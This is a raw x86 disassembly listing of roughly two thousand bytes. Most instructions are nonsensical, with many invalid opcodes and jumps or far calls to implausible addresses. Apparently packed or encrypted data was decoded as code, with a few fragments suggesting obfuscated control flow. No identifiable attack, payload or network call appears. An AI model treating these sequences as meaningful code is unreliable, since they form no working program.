  41256d:	push   ds
  41256e:	fsubp  st(7),st
  412570:	psubusb mm0,mm7
  412573:	js     0x41253e
  412575:	lods   al,BYTE PTR ds:[esi]
  412576:	push   eax
  412577:	dec    esi
  412578:	test   DWORD PTR [edi],edx
  41257a:	or     BYTE PTR [ebp+0x4608bba0],cl
  412580:	fucomip st,st(0)
  412582:	mov    ebx,0xf4d1341c
  412587:	test   eax,0x798070fb
  41258c:	fisttp WORD PTR [ebp+0x2646143a]
  412592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412593:	cmp    cl,BYTE PTR [edx+0x5c]
  412596:	aas    
  412597:	(bad)  
  412598:	jp     0x412577
  41259a:	sub    eax,0xdab20f64
  41259f:	dec    ecx
  4125a0:	clc    
  4125a1:	cmp    al,0x19
  4125a3:	mov    ?,WORD PTR [edi+eiz*1-0x3]
  4125a7:	sub    BYTE PTR [edx-0x1a],ch
  4125aa:	aam    0xe0
  4125ac:	jge    0x4125ee
  4125ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125af:	push   ebx
  4125b0:	cmp    al,0xe7
  4125b2:	icebp  
  4125b3:	lods   eax,DWORD PTR ds:[esi]
  4125b4:	or     dh,BYTE PTR [esi]
  4125b6:	jb     0x412618
  4125b8:	xchg   edx,eax
  4125b9:	clc    
  4125ba:	sahf   
  4125bb:	add    eax,0xde58105e
  4125c0:	push   esi
  4125c1:	les    ecx,FWORD PTR gs:[eax+0xd5c6c1]
  4125c8:	stos   DWORD PTR es:[edi],eax
  4125c9:	out    dx,al
  4125ca:	mov    esp,0x73268b05
  4125cf:	fwait
  4125d0:	sub    cl,BYTE PTR [ecx]
  4125d2:	ins    BYTE PTR es:[edi],dx
  4125d3:	xchg   edx,eax
  4125d4:	jbe    0x4125bc
  4125d6:	(bad)  
  4125d7:	lock push ss
  4125d9:	std    
  4125da:	adc    dh,BYTE PTR [edi]
  4125dc:	pop    edx
  4125dd:	test   eax,0x5c4b2953
  4125e2:	in     al,0xe4
  4125e4:	sub    dh,bh
  4125e6:	xor    BYTE PTR [eax],ah
  4125e8:	push   0x61
  4125ea:	add    esp,ebp
  4125ec:	test   al,0xea
  4125ee:	loop   0x412626
  4125f0:	(bad)  
  4125f1:	fld    st(7)
  4125f3:	mov    bl,0xed
  4125f5:	adc    bh,BYTE PTR [ebp-0x3fd4ee96]
  4125fb:	push   eax
  4125fc:	sahf   
  4125fd:	(bad)  
  4125fe:	in     al,0x53
  412600:	sti    
  412601:	mov    edx,0xdcffaabb
  412606:	add    eax,0xc7b787fd
  41260b:	pop    esp
  41260c:	arpl   WORD PTR [edi-0x6b9c6b54],di
  412612:	ss sub eax,0xd876977a
  412618:	test   dh,ch
  41261a:	(bad)  
  41261b:	cli    
  41261c:	test   al,0x31
  41261e:	jae    0x41261a
  412620:	dec    ebx
  412621:	adc    DWORD PTR [ecx-0x1bc0a77e],0x30
  412628:	lds    esp,FWORD PTR [esi-0x3c]
  41262b:	mov    ds:0xaf0dbfc3,eax
  412630:	and    al,0x6b
  412632:	xchg   ch,ch
  412634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412635:	mov    eax,ds:0x46b1a736
  41263a:	pop    ebp
  41263b:	loopne 0x41268a
  41263d:	xchg   ecx,eax
  41263e:	inc    edi
  41263f:	and    BYTE PTR [edx+esi*4-0x74],ch
  412643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412644:	lock and esi,DWORD PTR [ecx+0x74]
  412648:	mov    es,WORD PTR [ecx+0x5436cf64]
  41264e:	test   al,0x87
  412650:	inc    esi
  412651:	add    DWORD PTR [ecx-0xad77c00],0x1f744539
  41265b:	in     eax,dx
  41265c:	inc    eax
  41265d:	mov    eax,0xcd3db766
  412662:	shr    esp,cl
  412664:	add    BYTE PTR ds:0xf2b0da82,bh
  41266a:	xchg   eax,ebx
  41266c:	xor    eax,DWORD PTR [ebx+0x2bfc6cd2]
  412672:	in     al,dx
  412673:	loope  0x41260b
  412675:	es mov bl,0x27
  412678:	pop    ecx
  412679:	scas   al,BYTE PTR es:[edi]
  41267a:	inc    ebp
  41267b:	dec    ebp
  41267c:	call   0x8ac519f8
  412681:	xchg   esp,eax
  412682:	call   0xc7c55522
  412687:	and    bh,BYTE PTR [eax-0x6f83010d]
  41268d:	mov    ds:0x537d5b34,eax
  412692:	popf   
  412693:	test   al,0x6d
  412695:	in     eax,dx
  412696:	sbb    bl,BYTE PTR [edx-0x21]
  412699:	je     0x4126cd
  41269b:	out    0x51,eax
  41269d:	and    DWORD PTR [ebx-0x5],0xffffff83
  4126a1:	repnz outs dx,BYTE PTR ds:[esi]
  4126a3:	imul   esp,edi,0x68
  4126a6:	mov    ds:0x6723be7a,eax
  4126ab:	cmp    ecx,DWORD PTR [edi-0x5d]
  4126ae:	jecxz  0x412695
  4126b0:	pop    es
  4126b1:	pop    ebx
  4126b2:	test   eax,0x436ef7f
  4126b7:	rol    BYTE PTR [esi+0x31],1
  4126ba:	sbb    eax,0x83cae46b
  4126bf:	fsubr  DWORD PTR [ebx-0x3ee7b548]
  4126c5:	sbb    BYTE PTR [ecx-0x6f78739e],dh
  4126cb:	mov    esi,ss
  4126cd:	lock mov edi,ecx
  4126d0:	mov    edx,0xc1d70b99
  4126d5:	pop    edi
  4126d6:	mov    bh,0xad
  4126d8:	pusha  
  4126d9:	inc    esp
  4126da:	fsubr  st(2),st
  4126dc:	mov    al,ds:0x9f5c105
  4126e1:	clc    
  4126e2:	cmp    bh,BYTE PTR [ebp-0x58]
  4126e5:	mov    ds:0xb0fdbdb1,eax
  4126ea:	int3   
  4126eb:	pop    edx
  4126ec:	int3   
  4126ed:	loope  0x4126a8
  4126ef:	out    0xa0,al
  4126f1:	sub    DWORD PTR [esi-0x33b16e4e],ecx
  4126f7:	pop    eax
  4126f8:	fisttp WORD PTR [edi+eax*4-0x2d]
  4126fc:	popf   
  4126fd:	pop    ds
  4126fe:	mov    ch,0x51
  412700:	pop    ds
  412701:	std    
  412702:	jg     0x412729
  412704:	(bad)  
  412705:	ror    esp,1
  412707:	push   ss
  412708:	cwde   
  412709:	sub    bh,BYTE PTR [ebx]
  41270b:	outs   dx,DWORD PTR ds:[esi]
  41270c:	sub    ah,BYTE PTR [edi+0x3f]
  41270f:	mov    eax,0xd326c543
  412714:	push   es
  412715:	pop    edi
  412716:	daa    
  412717:	test   al,0xd5
  412719:	push   0xcaf0bb6b
  41271e:	sti    
  41271f:	push   ecx
  412720:	cmp    al,0x5e
  412722:	add    eax,0x7fcd73e9
  412727:	inc    esi
  412728:	call   0xd129:0xf9d9842b
  41272f:	inc    ecx
  412730:	xor    dl,BYTE PTR [esi-0xf]
  412733:	pushf  
  412734:	test   edi,eax
  412736:	inc    ebp
  412737:	hlt    
  412738:	cmp    DWORD PTR [ebp+0x45c7f89c],eax
  41273e:	mov    esp,0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	pop    edx
  412755:	sub    esp,DWORD PTR [esi-0x2c]
  412758:	stos   BYTE PTR es:[edi],al
  412759:	ins    BYTE PTR es:[edi],dx
  41275a:	js     0x4127d4
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	adc    dh,BYTE PTR [esi]
  412762:	ss dec esi
  412764:	pushf  
  412765:	outs   dx,BYTE PTR ds:[esi]
  412766:	or     BYTE PTR [ecx+0x1d],0x5a
  41276a:	sbb    edx,edx
  41276c:	cwde   
  41276d:	stos   BYTE PTR es:[edi],al
  41276e:	xchg   ecx,eax
  41276f:	jl     0x4127ca
  412771:	jns    0x412754
  412773:	mov    dl,0x34
  412775:	stos   BYTE PTR es:[edi],al
  412776:	mov    ch,0x8d
  412778:	(bad)  
  412779:	(bad)  
  41277b:	loopne 0x41273c
  41277d:	call   0x74d0:0x3562fcd3
  412784:	xchg   edx,eax
  412785:	ins    DWORD PTR es:[edi],dx
  412786:	mov    ebx,esi
  412788:	push   ss
  412789:	or     BYTE PTR [eax-0x28de3c9],ah
  41278f:	sub    ebx,DWORD PTR [ebp-0xb]
  412792:	mov    esi,0xdd17edc8
  412797:	call   0x63a3f9cc
  41279c:	scas   al,BYTE PTR es:[edi]
  41279d:	retf   
  41279e:	jbe    0x41280d
  4127a0:	les    esp,FWORD PTR [esi+0x79]
  4127a3:	ret    
  4127a4:	push   edi
  4127a5:	retf   
  4127a6:	sbb    BYTE PTR [ebx],al
  4127a8:	xchg   ecx,eax
  4127a9:	arpl   WORD PTR [ebp+0x5e],ax
  4127ac:	sti    
  4127ad:	inc    eax
  4127ae:	into   
  4127af:	packsswb mm3,mm5
  4127b2:	ins    BYTE PTR es:[edi],dx
  4127b3:	mov    edi,DWORD PTR [ecx-0x17c406d1]
  4127b9:	mov    edi,0x4417676c
  4127be:	lock sbb eax,0x35ba78c4
  4127c4:	cli    
  4127c5:	popf   
  4127c6:	mov    ah,BYTE PTR [ecx]
  4127c8:	mov    dh,0xce
  4127ca:	push   ss
  4127cb:	inc    BYTE PTR [esi]
  4127cd:	stc    
  4127ce:	sbb    DWORD PTR [edi],edi
  4127d0:	jbe    0x412775
  4127d2:	jne    0x41281d
  4127d4:	and    BYTE PTR [edx],ah
  4127d6:	and    al,0xc7
  4127d8:	lea    eax,[ecx]
  4127da:	fiadd  WORD PTR [edi]
  4127dc:	std    
  4127dd:	sahf   
  4127de:	popa   
  4127df:	xchg   esi,eax
  4127e0:	retf   
  4127e1:	(bad)  [esi+edi*8-0x51]
  4127e5:	lahf   
  4127e6:	test   eax,0x5a5c04bc
  4127eb:	fst    QWORD PTR [ecx]
  4127ed:	test   ax,0xf3b8
  4127f1:	dec    ecx
  4127f2:	sahf   
  4127f3:	add    al,0x5d
  4127f5:	je     0x4127e0
  4127f7:	cdq    
  4127f8:	(bad)  
  4127f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127fa:	push   es
  4127fb:	inc    esi
  4127fc:	mov    al,ds:0xdf0f0544
  412801:	std    
  412802:	sbb    ebx,DWORD PTR [edx+0x2d]
  412805:	mov    esi,0xdb989178
  41280a:	jmp    0x3d1d:0x176ad12f
  412811:	popf   
  412812:	xor    al,0x70
  412814:	mov    al,ds:0xc29fa6bb
  412819:	cmp    al,0x31
  41281b:	ins    BYTE PTR es:[edi],dx
  41281c:	loop   0x4127fb
  41281e:	pop    esi
  41281f:	adc    BYTE PTR [eax-0x577a2db1],cl
  412825:	jo     0x41286c
  412827:	jb     0x4127bf
  412829:	sbb    edi,DWORD PTR [ebp+0x4c9ad10f]
  41282f:	xlat   BYTE PTR ds:[ebx]
  412830:	jnp    0x412836
  412832:	lahf   
  412833:	push   cs
  412834:	dec    ebp
  412835:	lods   al,BYTE PTR ds:[esi]
  412836:	inc    edi
  412837:	add    dh,bl
  412839:	into   
  41283a:	sbb    esp,0x34a99906
  412840:	cwde   
  412841:	xchg   ebx,eax
  412842:	xlat   BYTE PTR ds:[ebx]
  412843:	inc    edx
  412844:	scas   al,BYTE PTR es:[edi]
  412845:	jg     0x4128ab
  412847:	int    0xc6
  412849:	test   eax,0xd9c5e1a7
  41284e:	push   ecx
  41284f:	add    eax,0xc05437ce
  412854:	jmp    0x4128a1
  412856:	repz sub al,0xa2
  412859:	inc    edi
  41285a:	lock ret 
  41285c:	dec    edx
  41285d:	pop    esp
  41285e:	cmp    dl,BYTE PTR [eax+0x53ad06fe]
  412864:	lods   al,BYTE PTR ds:[esi]
  412865:	cli    
  412866:	imul   ebx,DWORD PTR [edi-0x34],0xfffffff2
  41286a:	mov    ebp,0x558cbf71
  41286f:	scas   eax,DWORD PTR es:[edi]
  412870:	sub    esi,DWORD PTR [edx-0x79]
  412873:	add    al,0x26
  412875:	mov    ch,0xab
  412877:	imul   edx,DWORD PTR [esi],0xffffff80
  41287a:	cmp    DWORD PTR [edi],0x54
  41287d:	sub    BYTE PTR [ebx-0x71],bh
  412880:	mov    dl,0xa2
  412882:	mov    esi,DWORD PTR [edx+0x6]
  412885:	inc    esi
  412886:	inc    esp
  412887:	or     cl,cl
  412889:	or     edi,esp
  41288b:	xchg   ebp,eax
  41288c:	pushf  
  41288d:	arpl   WORD PTR [edi+0x45],si
  412890:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  412892:	popa   
  412893:	pop    ebx
  412894:	punpckhdq mm2,QWORD PTR [eax]
  412897:	pop    edi
  412898:	out    dx,al
  412899:	xor    BYTE PTR [ebx+0x2ca8c3b9],bl
  41289f:	shr    DWORD PTR [ebx+0x2d],1
  4128a2:	push   edi
  4128a3:	pop    edx
  4128a4:	ja     0x412893
  4128a6:	pop    esi
  4128a7:	dec    ebx
  4128a8:	loop   0x412891
  4128aa:	dec    esp
  4128ab:	fsub   DWORD PTR [ebx-0x64]
  4128ae:	jle    0x41287f
  4128b0:	cmp    cl,BYTE PTR [eax]
  4128b2:	pop    ds
  4128b3:	fimul  WORD PTR [esi]
  4128b5:	push   0x9c34c6f6
  4128ba:	inc    edi
  4128bb:	pop    ecx
  4128bc:	jg     0x41286e
  4128be:	les    ebx,FWORD PTR [ecx]
  4128c0:	push   cs
  4128c1:	retf   0xbf2c
  4128c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128c5:	daa    
  4128c6:	out    0xc3,eax
  4128c8:	clc    
  4128c9:	xlat   BYTE PTR ds:[ebx]
  4128ca:	sti    
  4128cb:	inc    esp
  4128cc:	or     dl,BYTE PTR [eax]
  4128ce:	jge    0x4128e4
  4128d0:	outs   dx,BYTE PTR ds:[esi]
  4128d1:	lock jnp 0x41288b
  4128d4:	cmp    esp,esp
  4128d6:	ins    BYTE PTR es:[edi],dx
  4128d7:	jno    0x4128db
  4128d9:	jle    0x412894
  4128db:	test   BYTE PTR gs:[edx+0x5f233620],bl
  4128e2:	pop    esp
  4128e3:	cmp    BYTE PTR [edx],cl
  4128e5:	ret    
  4128e6:	cs jp  0x412900
  4128e9:	retf   
  4128ea:	loop   0x41288d
  4128ec:	xor    BYTE PTR [edx],dh
  4128ee:	jmp    0x7bb2:0x2a510731
  4128f5:	push   ecx
  4128f6:	ficom  DWORD PTR [edi+0x15]
  4128f9:	inc    esi
  4128fa:	adc    eax,0x5031cb2b
  4128ff:	cmp    eax,0x8adbced9
  412904:	push   esi
  412905:	mov    dl,0x13
  412907:	lea    esp,[edi-0x2e423b58]
  41290d:	cmp    DWORD PTR [ecx-0x2eedea91],ebp
  412913:	adc    esp,DWORD PTR [edi+0x606c5c62]
  412919:	int    0xdc
  41291b:	iret   
  41291c:	push   ebx
  41291d:	cdq    
  41291e:	test   BYTE PTR [edx-0x65],al
  412921:	out    dx,al
  412922:	mov    dl,0x1f
  412924:	push   es
  412925:	ins    DWORD PTR es:[edi],dx
  412926:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412927:	dec    esp
  412928:	push   edx
  412929:	mov    esi,0xaaa538e5
  41292e:	fs cmp al,0x6f
  412931:	pop    esi
  412932:	mov    cl,0xa4
  412934:	dec    ebp
  412935:	(bad)  
  412937:	and    ebp,DWORD PTR [edx]
  412939:	mov    esp,0x92274802
  41293e:	sub    al,bh
  412940:	fcomp  QWORD PTR [edx+0x4b]
  412943:	pusha  
  412944:	sbb    DWORD PTR [edi+0x4f],edi
  412947:	retf   0x3c8b
  41294a:	jp     0x412928
  41294c:	call   0x9454:0x299e7e2c
  412953:	mov    WORD PTR [ebp+0xe8adb43],ss
  412959:	mov    BYTE PTR ds:0xd0a0b79c,0x31
  412960:	dec    esi
  412961:	jo     0x4128fa
  412963:	or     ebx,ebp
  412965:	xor    BYTE PTR [esi-0x41e157a0],0x99
  41296c:	fmul   DWORD PTR [ecx+0x36]
  41296f:	test   DWORD PTR [ebp+0x7c0444fe],esi
  412975:	jo     0x41296a
  412977:	test   BYTE PTR [edx-0x42],0x6d
  41297b:	shl    BYTE PTR [esi-0x16],cl
  41297e:	daa    
  41297f:	hlt    
  412980:	(bad)  
  412981:	xor    BYTE PTR [ebx+0x7242036e],dl
  412987:	jno    0x412916
  412989:	pop    eax
  41298a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41298b:	mov    eax,0x6d5be0f2
  412990:	adc    eax,0x87c68b11
  412995:	leave  
  412996:	pushf  
  412997:	pushf  
  412998:	das    
  412999:	xchg   edi,eax
  41299a:	ins    BYTE PTR es:[edi],dx
  41299b:	fbld   TBYTE PTR [edi+0x13]
  41299e:	pop    ss
  41299f:	js     0x41292d
  4129a1:	repz in eax,dx
  4129a3:	push   ebp
  4129a4:	out    0x40,eax
  4129a6:	sar    BYTE PTR [eax+ebp*1],cl
  4129a9:	test   DWORD PTR [ecx],ebp
  4129ab:	cmp    BYTE PTR [edi],al
  4129ad:	rcr    BYTE PTR [ecx-0x71],cl
  4129b0:	fld    TBYTE PTR [eax-0x2f5fad20]
  4129b6:	into   
  4129b7:	pop    esi
  4129b8:	and    al,0xec
  4129ba:	imul   ebx,DWORD PTR [edi+0x32],0x7a
  4129be:	cld    
  4129bf:	je     0x4129f0
  4129c1:	test   ebp,esi
  4129c3:	inc    ebx
  4129c4:	sub    DWORD PTR ds:0xc0a66802,eax
  4129ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129cb:	mov    edx,DWORD PTR [ebp-0x18]
  4129ce:	xor    edx,eax
  4129d0:	add    edx,ecx
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x4129a3
  4129f1:	mov    dh,BYTE PTR [ebx]
  4129f3:	or     al,0x17
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x412a16
  4129fd:	cmp    al,0x41
  4129ff:	inc    edi
  412a00:	mov    ebp,0xa4e1a65e
  412a05:	nop
  412a06:	jg     0x4129d8
  412a08:	repz mov fs,WORD PTR [ebx+0x6aab27c8]
  412a0f:	(bad)  
  412a10:	cmp    al,0xca
  412a12:	or     BYTE PTR [esi+0x134be3b9],bl
  412a18:	outs   dx,BYTE PTR ds:[esi]
  412a19:	sahf   
  412a1a:	pop    fs
  412a1c:	(bad)  [esi+0x4026c2c]
  412a22:	enter  0x6503,0xc6
  412a26:	jmp    0x6aa609c6
  412a2b:	mov    edx,0x795c0f29
  412a30:	mov    edx,0xcb01621c
  412a35:	sub    ecx,DWORD PTR [ebx]
  412a37:	ja     0x412a58
  412a39:	fnstcw WORD PTR [ebp+0x31460f91]
  412a3f:	imul   edx,ebp,0x4da0e12d
  412a45:	(bad)  
  412a46:	adc    edi,DWORD PTR [edi+0x1043fca1]
  412a4c:	int3   
  412a4d:	mov    dl,0x70
  412a4f:	adc    ecx,DWORD PTR [eax+0x4cf45813]
  412a55:	xchg   esi,eax
  412a56:	pop    ebx
  412a57:	add    al,0xc3
  412a59:	int3   
  412a5a:	ins    DWORD PTR es:[edi],dx
  412a5b:	sti    
  412a5c:	xchg   bh,al
  412a5e:	push   edi
  412a5f:	and    al,0xb2
  412a61:	and    bl,BYTE PTR [eax+0x7a663b23]
  412a67:	sub    BYTE PTR [ebp-0x69],cl
  412a6a:	push   ds
  412a6b:	push   esi
  412a6c:	mov    esp,0x7c87a6a6
  412a71:	ret    0x1c97
  412a74:	mov    al,0x50
  412a76:	hlt    
  412a77:	xchg   edi,eax
  412a78:	pop    ds
  412a79:	(bad)  
  412a7a:	int3   
  412a7b:	in     eax,0x25
  412a7d:	lods   eax,DWORD PTR ds:[esi]
  412a7e:	xlat   BYTE PTR ds:[ebx]
  412a7f:	push   edi
  412a80:	ds inc ebp
  412a82:	inc    ebp
  412a83:	(bad)  
  412a84:	stos   DWORD PTR es:[edi],eax
  412a85:	push   eax
  412a86:	lock pop edi
  412a88:	sbb    eax,0x3aadd2ba
  412a8d:	jae    0x412a42
  412a8f:	enter  0x75d2,0x67
  412a93:	pop    ss
  412a94:	fisttp QWORD PTR ds:0xcde4d553
  412a9a:	mov    eax,ds:0x100b0a62
  412a9f:	pop    es
  412aa0:	inc    eax
  412aa1:	xor    eax,0xbab315a8
  412aa6:	cld    
  412aa7:	inc    ebx
  412aa8:	in     eax,dx
  412aa9:	xchg   DWORD PTR [ebx-0x56],edi
  412aac:	in     al,0xa5
  412aae:	into   
  412aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ab0:	add    BYTE PTR [eax],dl
  412ab2:	xchg   esi,eax
  412ab3:	loopne 0x412afd
  412ab5:	data16 rcr BYTE PTR [ebp-0x170d7967],cl
  412abc:	push   ds
  412abd:	sbb    bl,cl
  412abf:	inc    ebp
  412ac0:	aas    
  412ac1:	loope  0x412ac5
  412ac3:	pop    ecx
  412ac4:	pop    ebp
  412ac5:	mov    ah,0x0
  412ac7:	fmul   QWORD PTR [edi]
  412ac9:	dec    ebx
  412aca:	pop    ss
  412acb:	cmp    eax,0x7928ad87
  412ad0:	nop
  412ad1:	into   
  412ad2:	sbb    eax,ebx
  412ad4:	cmp    dl,cl
  412ad6:	jge    0x412a97
  412ad8:	dec    ebp
  412ad9:	es (bad) 
  412adb:	dec    ecx
  412adc:	loope  0x412a80
  412ade:	add    bl,BYTE PTR [edx]
  412ae0:	dec    eax
  412ae1:	stos   DWORD PTR es:[edi],eax
  412ae2:	xchg   ebp,eax
  412ae3:	dec    BYTE PTR [esi+0x51]
  412ae6:	in     eax,0x6d
  412ae8:	scas   al,BYTE PTR es:[edi]
  412ae9:	out    dx,al
  412aea:	les    edi,FWORD PTR [eax]
  412aec:	test   al,0x78
  412aee:	inc    ebp
  412aef:	xor    eax,0xc77373b3
  412af4:	inc    edx
  412af5:	sti    
  412af6:	cmp    BYTE PTR [edx-0x381e9346],cl
  412afc:	sub    esi,esi
  412afe:	pop    es
  412aff:	mov    esi,0x6aee68c7
  412b04:	daa    
  412b05:	or     al,BYTE PTR ds:0xb46b17f5
  412b0b:	out    dx,eax
  412b0c:	adc    al,0x9b
  412b0e:	push   cs
  412b0f:	inc    ecx
  412b10:	push   es
  412b11:	dec    esp
  412b12:	stc    
  412b13:	ror    bl,0x2c
  412b16:	jo     0x412af3
  412b18:	jecxz  0x412ab2
  412b1a:	clc    
  412b1b:	fadd   DWORD PTR [edi-0x31]
  412b1e:	call   0x6b37:0xae88397d
  412b25:	lock stos BYTE PTR es:[edi],al
  412b27:	rcr    ecx,cl
  412b29:	mov    ebp,0xc1ef9a53
  412b2e:	repnz adc esp,DWORD PTR [ebx+0x7624a12]
  412b35:	lock bound ecx,QWORD PTR [ebx]
  412b38:	test   eax,0x2fb361a4
  412b3d:	(bad)  
  412b3e:	repz pop esp
  412b40:	sbb    ecx,DWORD PTR [ecx-0x4c0727c8]
  412b46:	xchg   ebp,eax
  412b47:	stos   BYTE PTR es:[edi],al
  412b48:	gs rol edx,cl
  412b4b:	push   ds
  412b4c:	pop    es
  412b4d:	sbb    al,0xbd
  412b4f:	scas   al,BYTE PTR es:[edi]
  412b50:	dec    edx
  412b51:	push   ebp
  412b52:	in     eax,0xcd
  412b54:	pop    eax
  412b55:	xor    dh,ch
  412b57:	mov    DWORD PTR [edi+0x13435699],edi
  412b5d:	or     BYTE PTR [edi-0xe496311],dl
  412b63:	and    DWORD PTR [ebp-0x5f],0xffffffe7
  412b67:	icebp  
  412b68:	ins    DWORD PTR es:[edi],dx
  412b69:	ret    0xbb89
  412b6c:	aaa    
  412b6d:	xor    DWORD PTR ds:0x852704fc,ebp
  412b73:	mov    dl,0x61
  412b75:	mov    edi,DWORD PTR [ebx]
  412b77:	xchg   edx,eax
  412b78:	inc    ebp
  412b79:	xor    ebp,DWORD PTR [esi+0x526f57c5]
  412b7f:	inc    eax
  412b80:	pop    es
  412b81:	enter  0x89e3,0x8a
  412b85:	mov    al,0x22
  412b87:	call   0xd3b14fe4
  412b8c:	adc    al,0x2e
  412b8e:	clc    
  412b8f:	in     eax,dx
  412b90:	fld    DWORD PTR [esi-0x733a6754]
  412b96:	pusha  
  412b97:	sbb    bl,ah
  412b99:	and    BYTE PTR [edx+0x29609396],dh
  412b9f:	bound  esi,QWORD PTR [esp+ecx*8-0x31]
  412ba3:	mov    bl,0xd8
  412ba5:	push   edi
  412ba6:	ffreep st(7)
  412ba8:	iret   
  412ba9:	push   ecx
  412baa:	int3   
  412bab:	enter  0xd884,0x3
  412baf:	mov    esi,0x283c013d
  412bb4:	or     al,BYTE PTR ds:0x6344e79f
  412bba:	ret    0x3e37
  412bbd:	lahf   
  412bbe:	clc    
  412bbf:	imul   edi,DWORD PTR [edx-0x7cfec3e8],0x5f
  412bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bc7:	neg    DWORD PTR [eax+0x2f]
  412bca:	loope  0x412b97
  412bcc:	push   0xd144ad32
  412bd1:	pop    ebp
  412bd2:	(bad)
  412bd5:	pop    ss
  412bd6:	fwait
  412bd7:	jbe    0x412ba2
  412bd9:	mov    ds:0xb0dd29dc,al
  412bdf:	nop
  412be0:	cli    
  412be1:	dec    ebx
  412be2:	xor    al,0xa4
  412be4:	sub    cl,ah
  412be6:	sbb    bl,dl
  412be8:	dec    ebp
  412be9:	mov    ds:0x7db5a022,al
  412bee:	mov    bh,0xd9
  412bf0:	add    DWORD PTR [ecx-0xd],0xffffffce
  412bf4:	adc    DWORD PTR [ebx+0xfa36fff],0xa724e0f4
  412bfe:	pop    edi
  412bff:	push   esi
  412c00:	adc    ah,BYTE PTR [eax-0x3c]
  412c03:	fwait
  412c04:	and    esi,DWORD PTR [eax-0x7c344b4b]
  412c0a:	jae    0x412c78
  412c0c:	mul    BYTE PTR [ecx]
  412c0e:	or     al,0x25
  412c10:	mov    ecx,0x42a66cda
  412c15:	xchg   esp,eax
  412c16:	mov    edi,0x96310b53
  412c1b:	xor    al,0xec
  412c1d:	stos   BYTE PTR es:[edi],al
  412c1e:	(bad)  
  412c1f:	cmc    
  412c20:	add    ebp,edi
  412c22:	mov    dh,0x8b
  412c24:	nop
  412c25:	cmp    al,0x4c
  412c27:	add    BYTE PTR [ebx],al
  412c29:	inc    ebp
  412c2a:	aam    0x56
  412c2c:	outs   dx,BYTE PTR ds:[esi]
  412c2d:	mov    dl,0x3e
  412c2f:	test   BYTE PTR [esi+0x57cced04],bh
  412c35:	or     dh,BYTE PTR [ecx+0x5d3bc19c]
  412c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c3c:	aaa    
  412c3d:	adc    eax,0x9498e21c
  412c42:	call   0x8dce:0xd13df8e4
  412c49:	inc    edi
  412c4a:	mov    esi,0x5991a192
  412c4f:	mov    edx,edx
  412c51:	sub    dh,BYTE PTR [eax+0x64e7a6b1]
  412c57:	sahf   
  412c58:	sub    cl,BYTE PTR ds:0x89cb7e93
  412c5e:	jmp    0xd926f833
  412c63:	xor    al,BYTE PTR [edx]
  412c65:	lock pop edi
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [esp+ecx*4],eax
  412c84:	sar    DWORD PTR [esp+edi*8-0x1a878789],cl
  412c8b:	jle    0x412d05
  412c8d:	js     0x412ca9
  412c8f:	lea    edx,[esi+ecx*8]
  412c92:	sub    al,0x84
  412c94:	fcom   st(1)
  412c96:	jae    0x412cec
  412c98:	inc    ebx
  412c99:	xor    ebp,DWORD PTR [esi]
  412c9b:	dec    DWORD PTR [edi+0xea6d3a6]
  412ca1:	jle    0x412d00
  412ca3:	add    DWORD PTR [edx-0x33],eax
  412ca6:	(bad)  
  412ca7:	pop    esi
  412ca8:	cmp    BYTE PTR [ecx-0x22],0x1c
  412cac:	dec    ebx
  412cad:	jne    0x412ccf
  412caf:	leave  
  412cb0:	int3   
  412cb1:	clc    
  412cb2:	push   ebx
  412cb3:	repnz in eax,0x6b
  412cb6:	aas    
  412cb7:	jg     0x412cc1
  412cb9:	stos   BYTE PTR es:[edi],al
  412cba:	out    0xe2,al
  412cbc:	fs xchg edi,eax
  412cbe:	mov    ebp,0x7abf78a4
  412cc3:	mov    cl,0x9c
  412cc5:	dec    ecx
  412cc6:	test   BYTE PTR [edi-0x784f97c2],bh
  412ccc:	aam    0x60
  412cce:	lock gs cmp al,0x52
  412cd2:	fidivr DWORD PTR [esi+0xf1b20ce]
  412cd8:	retf   0xc80e
  412cdb:	sar    DWORD PTR [edi-0x43316788],1
  412ce1:	xchg   BYTE PTR [esi+0x61],ch
  412ce4:	fild   DWORD PTR [ecx-0x2b86308d]
  412cea:	repz sbb al,0x13
  412ced:	bound  esi,QWORD PTR [eax-0x39]
  412cf0:	aad    0xbe
  412cf2:	(bad)  [ebx+0x74]
  412cf5:	or     DWORD PTR [edx-0x4b6b5898],edx
  412cfb:	mov    edx,0x621bc7cd
  412d00:	push   ebx
  412d01:	add    al,0x5c
  412d03:	mov    cl,0x9f
  412d05:	cld    
  412d06:	fbld   TBYTE PTR [edx]
  412d08:	cmp    BYTE PTR [esi+0x1e05ed1e],al
  412d0e:	js     0x412d43
  412d10:	add    eax,0xead59b4f
  412d15:	mov    esp,0xedfae8c
  412d1a:	jns    0x412cc6
